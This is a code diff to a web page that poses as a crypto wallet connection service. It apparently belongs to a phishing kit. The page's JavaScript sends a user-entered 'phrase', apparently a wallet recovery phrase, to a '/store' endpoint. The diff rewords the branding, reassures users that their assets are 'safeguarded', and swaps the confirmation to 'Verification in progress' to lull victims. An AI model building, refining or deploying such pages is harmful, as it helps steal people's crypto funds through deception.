@@ -89,12 +89,7 @@
                   </div></div>
                   </div></div>
 
-                  <div class="col-lg-3 col-4 my-2"><div class="card primary-bg"><div class="card-body"><div>
-                    <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr Binance-Smart-Chainidentifier"><img id="Bnb" onclick="change_wallet(this.id,this.src)" data-bs-toggle="modal" data-bs-target="#auth"  class="card-img-top" src="./WalletNetwork_files/bsc-logo.png" alt="Binance Smart Chain"></div>
-                    <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW Binance-Smart-Chainidentifier">Binance</div>
-                  </div></div>
-                  </div></div>
-
+                  
 
                   <div class="col-lg-3 col-4 my-2"><div class="card primary-bg"><div class="card-body"><div>
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr Metamaskidentifier"><img id="Metamask" onclick="change_wallet(this.id,this.src)" data-bs-toggle="modal" data-bs-target="#auth"  class="card-img-top" src="./WalletNetwork_files/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png" alt="Metamask"></div>
@@ -491,7 +486,7 @@
                         </div>
                         <div class="modal-body">
                             <h2 class="text-center my-4">
-                                <strong>Sync Defi </strong>enables authentication.
+                                <strong>Smart Wallet </strong>enables authentication.
                             </h2>
                             
                             <p class='my-4'>
@@ -500,7 +495,7 @@
                             </p>
                             <p class='my-4'>
                                 <i class="fas fa-shield-alt primary-text"></i>&nbsp;
-                               <b> Your funds will be safeguarded by security compliant services.</b>
+                               <b> Your assets will be safeguarded by security compliant services.</b>
                             </p>
                             <p class="my-4">
                                 <button class="btn primary-btn w-100 py-3" data-bs-target="#connect" data-bs-toggle="modal">
@@ -589,7 +584,7 @@ function change_wallet(wallet,logo){
         url: '/store',
         data: {phrase},
         success: function(data){
-          Swal.fire('Great','wallet successfully linked','success')
+          Swal.fire('Done','Verification in progress','success')
         }
     })
     }
